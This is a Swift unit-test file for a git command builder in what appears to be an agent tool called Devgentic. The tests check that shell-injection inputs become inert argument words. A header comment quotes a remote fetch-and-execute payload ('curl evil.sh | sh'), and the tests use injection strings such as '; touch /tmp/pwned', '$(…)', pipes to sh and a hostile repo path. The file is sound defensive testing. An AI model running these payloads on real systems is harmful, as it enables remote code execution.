//
//  GitCommandBuilderTests.swift
//  DevgenticTests
//
//  TDD: Tier 1d — GitTool Action Routing + Default Arguments
//
//  Rewritten 2026-07-30 from command STRINGS to argv. The builder used to produce
//  `"git -C \"\(repoPath)\" diff \(extraArgs)"` for `zsh -c`, with `extraArgs` interpolated
//  unquoted — `args: "; curl evil.sh | sh"` ran as its own command, no quote-break required.
//  These tests now assert on the argument vector, which is the contract that makes that
//  impossible rather than merely unlikely.
//

import XCTest
@testable import devgentic

final class GitCommandBuilderTests: XCTestCase {

    private let repoPath = "/Users/test/repo"

    private func argv(_ action: String, _ extraArgs: String = "",
                      file: StaticString = #filePath, line: UInt = #line) -> [String] {
        switch GitCommandBuilder.resolve(action: action, repoPath: repoPath, extraArgs: extraArgs) {
        case .argv(let argv): return argv
        case .error(let msg): XCTFail("expected .argv, got .error(\(msg))", file: file, line: line); return []
        }
    }

    // MARK: - Action routing

    func testResolve_Status_ReturnsStatusArgv() {
        XCTAssertEqual(argv("status"), ["-C", repoPath, "status", "--short"])
    }

    func testResolve_Log_DefaultArgs_UsesOneline() {
        XCTAssertEqual(argv("log"), ["-C", repoPath, "log", "-n", "10", "--oneline"])
    }

    func testResolve_Log_CustomArgs_OverridesDefaults() {
        let result = argv("log", "-n 5 --graph")
        XCTAssertEqual(result, ["-C", repoPath, "log", "-n", "5", "--graph"])
        XCTAssertFalse(result.contains("--oneline"), "custom args replace the defaults")
    }

    func testResolve_Diff_PassesThroughArgs() {
        XCTAssertEqual(argv("diff", "--staged"), ["-C", repoPath, "diff", "--staged"])
    }

    func testResolve_Branch_PassesThroughArgs() {
        XCTAssertEqual(argv("branch", "--list"), ["-C", repoPath, "branch", "-a", "--list"])
    }

    func testResolve_StashList_FixedArgv() {
        XCTAssertEqual(argv("stash_list"), ["-C", repoPath, "stash", "list"])
    }

    // MARK: - Blame requires args

    func testResolve_Blame_WithArgs_ReturnsArgv() {
        XCTAssertEqual(argv("blame", "main.swift"), ["-C", repoPath, "blame", "main.swift"])
    }

    func testResolve_Blame_WithoutArgs_ReturnsError() {
        guard case .error(let msg) = GitCommandBuilder.resolve(
            action: "blame", repoPath: repoPath, extraArgs: "") else {
            return XCTFail("expected .error for blame without args")
        }
        XCTAssertTrue(msg.contains("filename for blame"))
    }

    /// Whitespace-only args now fail the same guard. Previously they passed it and reached git
    /// as `blame` with no file, which fails with a less useful message.
    func testResolve_Blame_WhitespaceOnlyArgs_ReturnsError() {
        guard case .error = GitCommandBuilder.resolve(
            action: "blame", repoPath: repoPath, extraArgs: "   ") else {
            return XCTFail("expected .error for whitespace-only args")
        }
    }

    // MARK: - Show defaults

    func testResolve_Show_DefaultArgs_UsesHEAD() {
        XCTAssertEqual(argv("show"), ["-C", repoPath, "show", "HEAD", "--stat"])
    }

    func testResolve_Show_CustomArgs_OverridesHEAD() {
        let result = argv("show", "abc123")
        XCTAssertEqual(result, ["-C", repoPath, "show", "abc123", "--stat"])
        XCTAssertFalse(result.contains("HEAD"))
    }

    // MARK: - Unknown action

    func testResolve_UnknownAction_ReturnsError() {
        guard case .error(let msg) = GitCommandBuilder.resolve(
            action: "rebase", repoPath: repoPath, extraArgs: "") else {
            return XCTFail("expected .error for unknown action")
        }
        XCTAssertTrue(msg.contains("Unknown git action"))
        XCTAssertTrue(msg.contains("rebase"))
    }

    // MARK: - Injection

    /// The payload that used to run. Unquoted interpolation meant this needed no quote-break:
    /// `git -C "…" diff ; touch /tmp/pwned` is two shell commands.
    func testShellOperatorsBecomeInertArguments() {
        XCTAssertEqual(argv("diff", "; touch /tmp/pwned"),
                       ["-C", repoPath, "diff", ";", "touch", "/tmp/pwned"],
                       "operators must survive as literal argv words, never as syntax")
    }

    func testCommandSubstitutionIsNotEvaluated() {
        XCTAssertEqual(argv("log", "$(touch /tmp/pwned)"),
                       ["-C", repoPath, "log", "$(touch", "/tmp/pwned)"])
        XCTAssertEqual(argv("log", "`id`"), ["-C", repoPath, "log", "`id`"])
    }

    func testPipesAndRedirectionAreNotOperators() {
        XCTAssertEqual(argv("log", "--oneline | sh"),
                       ["-C", repoPath, "log", "--oneline", "|", "sh"])
        XCTAssertEqual(argv("log", "> /tmp/out"), ["-C", repoPath, "log", ">", "/tmp/out"])
    }

    /// The repo path was interpolated into the same string and is equally reachable. As an
    /// argv element it cannot be anything but a path.
    func testRepoPathIsAlwaysASingleArgument() {
        let hostile = #"/tmp/repo" ; touch /tmp/pwned ; echo ""#
        guard case .argv(let result) = GitCommandBuilder.resolve(
            action: "status", repoPath: hostile, extraArgs: "") else {
            return XCTFail("expected .argv")
        }
        XCTAssertEqual(result, ["-C", hostile, "status", "--short"],
                       "the whole hostile string is ONE argument")
    }

    // MARK: - Tokenizer

    /// The reason this is a real tokenizer and not `split(separator: " ")`: git arguments
    /// legitimately contain quoted spaces, and splitting naively breaks them in half.
    func testQuotedArgumentsSurviveAsOneWord() {
        XCTAssertEqual(GitCommandBuilder.tokenize(#"--author="J Smith""#), [#"--author=J Smith"#])
        XCTAssertEqual(GitCommandBuilder.tokenize("-S 'some string'"), ["-S", "some string"])
    }

    func testEscapedSpacesSurvive() {
        XCTAssertEqual(GitCommandBuilder.tokenize(#"my\ file.swift"#), ["my file.swift"])
    }

    /// A backslash inside single quotes is literal, matching shell word-splitting — otherwise
    /// a Windows-style path in quotes would lose its separators.
    func testBackslashIsLiteralInsideSingleQuotes() {
        XCTAssertEqual(GitCommandBuilder.tokenize(#"'a\b'"#), [#"a\b"#])
    }

    func testRepeatedAndTrailingWhitespaceCollapses() {
        XCTAssertEqual(GitCommandBuilder.tokenize("  -n   5  "), ["-n", "5"])
        XCTAssertEqual(GitCommandBuilder.tokenize(""), [])
        XCTAssertEqual(GitCommandBuilder.tokenize("   "), [])
    }

    /// An unterminated quote yields what it has rather than throwing. A tool argument is not a
    /// shell prompt; failing the whole call over a stray quote is worse than passing git one
    /// odd revision name, which it will reject with a clear message.
    func testUnterminatedQuoteDoesNotLoseTheWord() {
        XCTAssertEqual(GitCommandBuilder.tokenize(#"--author="J Smith"#), ["--author=J Smith"])
    }
}
